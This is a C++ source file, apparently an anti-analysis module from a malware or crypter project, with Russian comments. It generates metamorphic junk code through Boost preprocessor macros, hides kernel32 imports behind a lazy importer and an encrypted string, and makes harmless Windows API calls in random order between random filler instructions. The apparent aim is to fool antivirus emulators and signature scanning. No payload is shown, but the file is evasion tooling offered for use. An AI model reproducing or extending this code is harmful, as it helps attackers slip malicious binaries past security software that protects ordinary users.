﻿#include <windows.h>
#include <stdint.h>
#include <iostream>
#include "../modules.h"
#include "../lazy_importer/lazy_importer.hpp"
#include "../../modules/data_crypt_string.h"

#include "../../modules/metamorph_code/config.h"
#include "../../modules/metamorph_code/boost/preprocessor/repetition/repeat_from_to.hpp"
#include <boost/preprocessor/cat.hpp>
#include <boost/preprocessor/repetition/repeat_from_to.hpp>

static uint32_t eax_random = 0;

extern "C" {
	void __cdecl do_fake_instr(void);
}

extern "C" {
	uint32_t __stdcall do_Random_EAX(uint32_t min, uint32_t max);
}

extern "C" {
	void __cdecl  debug_print(unsigned line) {
		//Морфинг кода при компиляции************************************************************
        #define DECL(z, n, text) BOOST_PP_CAT(text, n) ();
		BOOST_PP_REPEAT_FROM_TO(START_MORPH_CODE, END_MORPH_CODE, DECL, function)
		//Морфинг кода при компиляции************************************************************
	}
};

static void fake_api_calls(void) {

	str_to_decrypt(kernel32, 13, magic_key, 4);
	auto base = reinterpret_cast<std::uintptr_t>(LI_FIND(LoadLibraryA)(kernel32));
	str_to_encrypt(kernel32, 13, magic_key, 4);

	//Рандомное число, для вызова API в случайном порядке
	eax_random = do_Random_EAX(0, 9);

	//Рандомно вызываем API
	if (eax_random == 0) {
		LPSTR wiapi1 = LI_GET(base, GetCommandLineA)();
	}
	else if (eax_random == 1) {
		DWORD wiapi2 = LI_GET(base, GetTickCount)();
	}
	else if (eax_random == 2) {
	    DWORD wiapi3 = LI_GET(base, GetTickCount)();
	}
	else if (eax_random == 3) {
		DWORD wiapi4 = LI_GET(base, GetLastError)();
	}
	else if (eax_random == 4) {
		DWORD wiapi5 = LI_GET(base, GetVersion)();
	}
	else if (eax_random == 5) {
		HANDLE wiapi6 = LI_GET(base, GetCurrentProcess)();
	}
	else if (eax_random == 6) {
		HANDLE wiapi7 = LI_GET(base, GetProcessHeap)();
	}
	else if (eax_random == 7) {
		LPWCH wiapi8 = LI_GET(base, GetEnvironmentStrings)();
	}
	else if (eax_random == 8) {
		HANDLE wiapi9 = LI_GET(base, GetProcessHeap)();
	}
	else if (eax_random == 9) {
		LANGID wiapi10 = LI_GET(base, GetSystemDefaultLangID)();
	}
}

uint32_t fake_api_instruction_gen(uint32_t instruction, uint32_t api) {
	//Генерация случайных иснтрукций, нужного числа
	for (uint32_t i = 0; i < instruction; i++) {
		do_fake_instr();
	}

	//Вызовы случайных API, нужного числа
	for (uint32_t i = 0; i < api; i++) {
		fake_api_calls();
	}

	return eax_random;
}